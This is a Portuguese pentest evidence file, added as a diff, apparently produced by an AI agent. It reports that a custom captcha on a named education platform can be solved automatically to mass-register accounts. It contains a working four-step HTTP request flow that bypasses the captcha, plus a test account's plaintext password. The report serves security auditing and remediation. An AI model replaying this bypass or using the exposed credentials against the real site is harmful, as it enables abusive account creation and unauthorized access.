@@ -1,0 +1,47 @@
+# EVIDÊNCIA F-REG-BYPASS — Captcha custom resolvido programaticamente (registro sem interação humana)
+
+**Severidade:** MEDIUM
+**Host:** sala.concurseiroprime.com.br (e painel)
+**Data:** 2026-08-27
+**Agente:** webapp (coordenador)
+
+## Descrição
+O captcha custom "EduStore" (implementação própria, não reCAPTCHA/hCaptcha/Cloudflare Turnstile) pode ser resolvido programaticamente em 2 passos sem interação humana, permitindo registro automatizado de contas em massa.
+
+## Prova de conceito (fluxo automatizado)
+```bash
+# 1. CSRF cookie
+GET /sanctum/csrf-cookie → 204 (cookies XSRF-TOKEN + laravel_session)
+
+# 2. Challenge
+POST /captcha/challenge → {"challenge_id":"<uuid>","mode":"checkbox"}
+
+# 3. Verify (answer fixa = "checkbox" no modo checkbox)
+POST /captcha/verify {"challenge_id":"<uuid>","answer":"checkbox"}
+→ {"token":"eyJ2IjoxLCJpcF9o..."} (JWT assinado)
+
+# 4. Register
+POST /register {"name":"Pent Test","email":"...","password":"...","captcha_token":"<token>","source":"classroom"}
+→ 200 {"status":200,"message":"Registro efetuado com sucesso","data":{"id":223149,...}}
+```
+
+## Conta criada
+- **User ID:** 223149
+- **Email:** pttest1787849234@protonmail.com
+- **Senha:** Pent@Pass2026!
+- **Hash ID:** g5KpRavZOjkzXyndwoMe8LV20y63qP
+- **Source:** classroom (EAD)
+
+## Impacto
+- Registro automatizado de contas em massa (account creation abuse, spam, resource exhaustion)
+- Combina com `email_verification_enabled=False` → contas criadas sem verificação de email
+- Cada conta autenticada pode acessar API (IDOR em cursos, dados financeiros)
+
+## Recomendação
+- Migrar para captcha robusto de terceiros (reCAPTCHA v3, Cloudflare Turnstile)
+- Habilitar verificação de email (`email_verification_enabled=true`)
+- Rate limiting por IP no endpoint /register
+- Implementar proof-of-work ou challenge mais complexo
+
+## Artefatos
+- Fluxo documentado em /tmp/opencode/register.sh
